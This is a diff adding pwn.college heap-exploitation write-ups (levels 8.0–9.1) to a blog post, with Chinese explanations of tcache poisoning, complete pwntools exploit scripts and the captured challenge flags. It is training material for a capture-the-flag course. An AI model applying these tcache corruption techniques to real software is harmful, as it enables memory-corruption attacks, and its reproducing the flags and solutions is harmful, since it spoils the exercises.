@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
 published: 2025-09-08
-updated: 2025-09-11
+updated: 2025-09-30
 description: "Write-ups for pwn.college binary exploitation series."
 image: "https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.41yct5dsj8.avif"
 tags: ["Pwn", "Write-ups", "Heap"]
@@ -1501,3 +1501,506 @@ if __name__ == "__main__":
 ## Flag
 
 :spoiler[`pwn.college{cy0iZfUAyZ9bbo5DL_cS-9sxRN6.0FN4MDL5cTNxgzW}`]
+
+# Level 8.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to pass a validation check.
+
+## Write-up
+
+和上题几乎是一样的，除了这次 secret 被刻意放在了以 `\x0a` 结尾的地址处。由于它代表 LF (Line Feed)，所以我们不能直接通过 `scanf` 将它读入，最终会少写一个 `\x0a`。只要解决了这个问题，其它的问题就可以直接套用上题 exp 思路了。
+
+感觉这题还是有一点小难的，至少对于刚开始学的我来说并不简单。当时卡了我两天，没有什么头绪，唯一想到可行的解法是 scanf overwrite fd，指向 secret 地址向后偏移 4 字节的地方，然后我们可以就可以泄漏 12/16 的 secret 了。问题是，如何得到剩下的四个字符呢？我想过伪造 chunk 什么的方法，但是都已失败告终了。最后，我还是老老实实的写了个 bruteforce 的 approach，结果预估了一下时间，爆破四个小写字母，也就是 $1/26^{4}$ 的 chance 成功，单线程都跑不满的情况下，得要 2h 45min……草啊，我本地得测试吧，3h 没了，远程再打一遍，3h 又没了。虽然这个方法可行，但是感觉也太蠢了……
+
+后来尝试让 AI 写个多线程爆破的 approach，写的和屎一样，最后虽然写出来了，但还是有点问题，总之虽然爆破理论可行，但是因为我运气不好，就没见过它爆出来的样子……
+
+不过回想起去年，也让 AI 写过多线程爆破的脚本，相比那次，这次代码质量算高了好几倍了，发展的还是很快的/悲
+
+遂又去思考更好的方法，思考能不能泄漏完整的 secret 。想了整整一下午，没想出来，感觉完整泄漏好像不太可能，然后盯着检测代码发呆，~试图看穿屏幕……~
+
+```c
+    if ( strcmp(s1, "send_flag") )
+      break;
+    printf("Secret: ");
+    __isoc99_scanf("%127s", s1);
+    puts(s_0);
+    if ( !memcmp(s1, s2_0, 0x10u) )
+    {
+      puts("Authorized!");
+      win();
+    }
+    else
+    {
+      puts("Not authorized!");
+    }
+```
+
+既然不能泄漏完整的 secret，那还有没有其它通过这个检测的方法呢？思考……突然灵光闪现，因为 malloc 从 tcache 取 chunk 会将它的 key 清空，那如果我们 malloc 到 secret 前面，然后让 `tcache_get` 将 secret 的前 8 字节清空，是不是就相当于知道了 secret 的前 8 字节为 NULL？然后结合我们之前的思路，可以泄漏后 8 字节……草，出了！
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p32,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level8.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendlineafter(b"Size: ", str(size).encode("ascii"))
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", secret)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def main():
+    launch()
+
+    secret = elf.bss() + 0x1230A + 0x8
+    zero_out = elf.bss() + 0x1230A - 0x8
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret))
+    malloc(0, 0)
+    malloc(0, 0)
+    puts(0)
+    target.recvuntil(b"Data: ")
+    secret = target.recvline().strip()
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    # raw_input("DEBUG")
+    scanf(0, p32(zero_out))
+    malloc(0, 0)
+    malloc(0, 0)
+
+    # raw_input("DEBUG")
+    payload = flat(
+        0,
+        secret,
+    )
+    send_flag(payload)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{4xf_sG0yXaGhMXdibln3SOAB5xv.0VN4MDL5cTNxgzW}`]
+
+# Level 8.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to pass a validation check.
+
+## Write-up
+
+参见 [Level 8.0](#level-80)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p32,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level8.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendlineafter(b"Size: ", str(size).encode("ascii"))
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", secret)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def main():
+    launch()
+
+    secret = elf.bss() + 0x19E0A + 0x8
+    zero_out = elf.bss() + 0x19E0A - 0x8
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret))
+    malloc(0, 0)
+    malloc(0, 0)
+    puts(0)
+    target.recvuntil(b"Data: ")
+    secret = target.recvline().strip()
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    # raw_input("DEBUG")
+    scanf(0, p32(zero_out))
+    malloc(0, 0)
+    malloc(0, 0)
+
+    # raw_input("DEBUG")
+    payload = flat(
+        0,
+        secret,
+    )
+    send_flag(payload)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{0K4zGLVnFNCz2zhqd0R7tWLsOLW.0lN4MDL5cTNxgzW}`]
+
+# Level 9.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to pass a validation check.
+
+## Write-up
+
+和上题一样，但是这次不能分配到 secret 附近了，泄漏完全不可能。不过还是可以利用 `tcache_get` 清空 NULL 的特性将 secret 完全清空，这样我们就知道 secret 为 NULL 了。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p32,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level9.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", secret)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    secret_p1 = elf.bss() + (0x16364 - 0x8)
+    secret_p2 = elf.bss() + 0x16364
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret_p1))
+    # raw_input("DEBUG")
+    malloc(0, 0)
+    malloc(0, 0)
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret_p2))
+    # raw_input("DEBUG")
+    malloc(0, 0)
+    malloc(0, 0)
+
+    payload = flat(0, 0)
+    send_flag(payload)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{klIR9JBrG0FfOAzXz_dLAeG0C5g.01N4MDL5cTNxgzW}`]
+
+# Level 9.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to pass a validation check.
+
+## Write-up
+
+参见 [Level 9.0](#level-90)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p32,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level9.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", secret)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    secret_p1 = elf.bss() + (0x12821 - 0x8)
+    secret_p2 = elf.bss() + 0x12821
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret_p1))
+    # raw_input("DEBUG")
+    malloc(0, 0)
+    malloc(0, 0)
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    scanf(0, p32(secret_p2))
+    # raw_input("DEBUG")
+    malloc(0, 0)
+    malloc(0, 0)
+
+    payload = flat(0, 0)
+    send_flag(payload)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{YpgPY9CRd5Wk4FCJ7klY0D4fwXX.0FO4MDL5cTNxgzW}`]
